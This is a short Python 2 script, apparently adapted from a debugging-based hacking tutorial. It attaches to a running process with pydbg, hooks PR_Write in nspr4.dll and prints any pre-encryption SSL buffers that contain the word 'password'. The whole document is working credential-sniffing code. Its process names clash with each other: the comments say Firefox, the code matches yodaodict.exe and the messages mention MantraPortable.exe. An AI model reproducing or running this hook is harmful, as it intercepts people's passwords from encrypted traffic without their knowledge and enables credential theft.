#coding=utf-8
#!/ur/bin/env python
import sys

from pydbg.pydbg import *
# from utils.pydbg.pydbg.defines import *

sys.path.append("paimei")
from paimei.utils.hooking import hook_container


dbg = pydbg()
found_firefox = False
pattern = "password"


def ssl_sniff(dbg, args):
    buffer = ""
    offset = 0
    while 1:
        byte = dbg.read_process_memory(args[1] + offset, 1)
        if byte != "\x00":
            buffer += byte
            offset += 1
            continue
        else:
            break
    if pattern in buffer:
        print "Pre-Encrypted: %s" % buffer
    return DBG_CONTINUE


if __name__ == "__main__":
    # 寻找firefox.exe的进程
    for (pid, name) in dbg.enumerate_processes():
        if name.lower() == "yodaodict.exe":
            found_firefox = True
            hooks = hook_container()
            dbg.attach(pid)
            print "[*] Attaching to MantraPortable.exe with pid %d " % pid
            hook_address = dbg.func_resolve_debuggee("nspr4.dll", "PR_Write")

            if hook_address:
                hooks.add(dbg, hook_address, 2, ssl_sniff, None)
                print "[*] nspr4.dll PE_Write hooked at :0x%08x " % hook_address
                break
            else:
                print "[*] could not reslove hook address"
                sys.exit(-1)

    if found_firefox:
        print "[*] hook set ,continue process"
        dbg.run()

    else:
        print "[*] Error could not find MantraPortable.exe"
        sys.exit(-1)